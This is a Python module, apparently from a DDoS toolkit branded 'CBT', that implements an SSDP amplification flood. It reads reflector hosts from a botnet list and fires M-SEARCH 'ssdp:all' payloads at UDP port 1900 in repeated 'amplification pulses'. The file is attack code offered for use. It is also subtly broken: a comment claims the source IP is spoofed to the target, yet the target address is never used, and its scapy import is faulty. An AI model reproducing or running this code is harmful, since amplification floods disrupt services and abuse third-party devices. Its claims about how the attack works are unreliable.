#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the CBT (Core Brim Tech) project, https://www.corebrimtech.com

Copyright (c) 2024 | MOMODU KAMARA-KOLLEH

You should have received a copy of the GNU General Public License along
with CBT; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket, time
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse
try:
    from scapy import *
except:
    print("\nError importing: scapy lib.\n")
    sys.exit(2)

# CBT SSDP Amplification (SSDP)
def sIP(ssdps):
    try:
        ssdp = random.choice(ssdps)
        if ssdp.startswith('http://'):
            ssdp = ssdp.replace('http://','')
        elif ssdp.startswith('https://'):
            ssdp = ssdp.replace('https://','')
        try:
            ip = socket.gethostbyname(ssdp)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4']
                url = urlparse(ssdp)
                a = r.query(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except:
                ip = None
        return ip
    except:
        return None

def ssdpize(ip, port, rounds):
    f = open('botnet/ssdps.txt')
    base_stations = f.readlines()
    base_stations = [ base_station.replace('\n','') for base_station in base_stations ]
    f.close()
    n=0
    try:
        for x in range (0,int(rounds)):
            n=n+1
            s_ssdp_ip = sIP(base_stations)
            if s_ssdp_ip == None:
                print("[Error] [AI] [SSDP] Impossible to retrieve 'base stations' -> [Aborting!]\n")
                break
            # SSDP M-SEARCH amplification payload
            payload = b'M-SEARCH * HTTP/1.1\r\n'
            payload += b'HOST: 239.255.255.250:1900\r\n'
            payload += b'MAN: "ssdp:discover"\r\n'
            payload += b'ST: ssdp:all\r\n'
            payload += b'MX: 2\r\n'
            payload += b'\r\n'
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                # Spoof source IP to target
                sock.sendto(payload, (s_ssdp_ip, 1900))
                print("[Info] [AI] [SSDP] Redirecting 'base station' ["+str(n)+"] ["+str(s_ssdp_ip)+"] -> [AMPLIFYING!]")
                time.sleep(0.1)
                sock.close()
            except:
                print("[Error] [AI] [SSDP] Failed to redirect 'base station' ["+str(n)+"] ["+str(s_ssdp_ip)+"]")
    except:
        print("[Error] [AI] [SSDP] Failing to engage... -> Is still target online? -> [Checking!]")

class SSDP(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] SSDP Amplification (SSDP) is ready to fire: [" , rounds, "amplification pulses ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
            port = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            port = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4']
                url = urlparse(target)
                a = r.query(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [SSDP] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        ssdpize(ip, port, rounds)
